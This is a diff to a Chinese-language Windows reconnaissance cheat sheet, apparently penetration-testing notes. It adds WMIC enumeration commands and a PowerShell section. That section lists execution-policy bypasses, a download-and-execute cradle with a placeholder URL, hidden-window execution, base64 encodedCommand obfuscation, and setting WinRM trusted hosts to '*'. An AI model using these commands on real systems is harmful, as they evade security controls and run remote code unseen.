@@ -13,6 +13,7 @@
 - 查看操作系统架构 ``wmic os get osarchitecture``
 - 查看逻辑盘 ``wmic logicaldisk get caption``
 - 查看安装的软件 ``wmic product get name,version``
+- 查看Powershell版本：``REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion``
 
 域信息
 ----------------------------------------
@@ -104,6 +105,7 @@
 		+ 查看nic命令帮助：``wmic nic /?``
 		+ 信息筛选：``wmic nic where NetConnectionStatus=2 get Name,MACAddress,NetConnectionStatus``
 	- 查看杀软：``WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName``
+	- 查看启动项：``wmic startup get caption,command``
 	- 进程管理
 		+ 列出进程的核心信息：``wmic process list brief``
 		+ 新建进程：``wmic process call create notepad``
@@ -154,6 +156,7 @@
 		+ 卸载.msi安装包：``wmic PRODUCT where "name='Microsoft .NET Framework 1.1' and Version='1.1.4322'" call Uninstall``
 		+ 修复.msi安装包：``wmic PRODUCT where "name='Microsoft .NET Framework 1.1' and Version='1.1.4322'" call Reinstall``
 	- 服务程序管理
+		+ 查看服务列表：``wmic service list brief``
 		+ 运行spooler服务：``wmic SERVICE where name="Spooler" call startservice``
 		+ 停止spooler服务：``wmic SERVICE where name="Spooler" call stopservice``
 		+ 暂停spooler服务：``wmic SERVICE where name="Spooler" call PauseService``
@@ -170,6 +173,55 @@
 	- 用户帐户管理
 		+ 更改用户administrator全名为admin：``wmic USERACCOUNT where name="Administrator" set FullName="admin"``
 		+ 更改用户名admin为admin00：``wmic useraccount where "name='admin'" call Rename admin00``
++ PowerShell
+	- 简介
+		+ 一个PowerShell脚本其实就是一个简单的文本文件，其扩展名为".ps1"。PowerShell脚本文件中包含一系列命令，每个命令为独立一行。
+		+ 执行策略：为防止恶意脚本，默认情况下策略为 **不能执行** 。
+		+ 使用 ``get-executionPolicy`` 获取当前执行策略。
+			::
+			
+				Restricted：脚本不能运行（默认设置）
+				RemoteSigned：在本地创建脚本可以运行，但从网上下载的不能（拥有数字证书签名除外）
+				AllSigned：仅当脚本受信任的发布者签名时才能运行
+				Unrestricted：允许所有脚本运行
+				
+				设置策略：set-ExecutionPolicy <policy name>
+		+ 管道：``get-process p* | stop-process``
+	- 绕过执行策略
+		+ 管道：``Type helloword.ps1 |powershell.exe -NoP -``
+		+ 网络下载：``powershell -nop -c "iex(New-Object Net.WebClient).DowndloadString('url')"``
+		+ bypass方式：``powershell.exe -ExecutionPolicy bypass -File helloworld.ps1``
+		+ 加密方式：即encodedCommand方式。
+		+ 隐藏执行：``PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File xxx.ps1``
+	- 查看版本：``get-host``,``$PSVersionTable.PSVERSION``
+	- 查看支持命令：``get-command``
+		+ 查看命令帮助：``Get-Help Enter-PSSession``
+	- 获取所有进程：``get-process``
+	- -command 命令参数
+		+ 此方法不需要一个交互式窗口，它适用于简单脚本执行，对于复杂脚本会发生解析错误。
+		+ ``PowerShell -command "Write-Host 'you are good.'"``
+	- -encodedCommand命令参数
+		+ 此方法的输入内容是Unicode/base64 encod字符串，使用以下方式编码
+			::
+			
+				$command = 'dir "c:\program files" '
+				$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+				$encodedCommand = [Convert]::ToBase64String($bytes)
+				$encodedCommand即为最终的字符串。
+		+ ``PowerShell -encodedCommand ZABpAHIAIAAiAGMAOgBcAHAAcgBvAGcAcgBhAG0AIABmAGkAbABlAHMAIgAgAA==``
+	- 运行远程命令
+		+ WS-Management协议:为计算机设备远程交换管理数据提供了一个公开的标准，在Windows上，微软通过WinRM实现。
+		+ 检查WinRM服务：``Get-Service WinRM``
+		+ 启动并配置系统接收远程命令：``Enable-PSRemoting –Force``
+			::
+			
+				如果你的计算机已经加入了域，那么上面的配置就可以了。
+				对于没有加入域的计算机还需要进行信任设置，然后重启 WinRM 服务：
+				Set-Item wsman:\localhost\client\trustedhosts *
+				Restart-Service WinRM
+		+ 测试远程命令：``Test-WsMan xxx.xxx.xxx.xxx``
+		+ 创建远程连接session：``Enter-PSSession -ComputerName my-svr -Credential ****(用户名)***``
+		+ 远程执行单个命令：``Invoke-Command -ComputerName cd-lsr-svr -ScriptBlock { Get-Service WinRM } -credential ****(用户名)***``
 + 日志与事件信息
 	- ``wevtutil``
 + 注册表信息
